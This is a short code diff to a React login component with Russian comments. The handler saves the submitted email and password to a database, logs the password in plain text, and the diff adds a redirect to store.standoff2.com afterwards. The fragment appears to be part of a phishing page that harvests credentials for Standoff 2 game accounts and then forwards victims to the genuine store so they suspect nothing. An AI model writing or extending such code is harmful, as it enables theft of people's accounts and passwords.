@@ -26,6 +26,8 @@ const Login = () => {
         console.error("Ошибка сохранения:", error);
       } else {
         console.log("Данные сохранены в БД:", { email, password });
+        // Перенаправляем на store.standoff2.com
+        window.location.href = "https://store.standoff2.com/";
       }
     }
   };
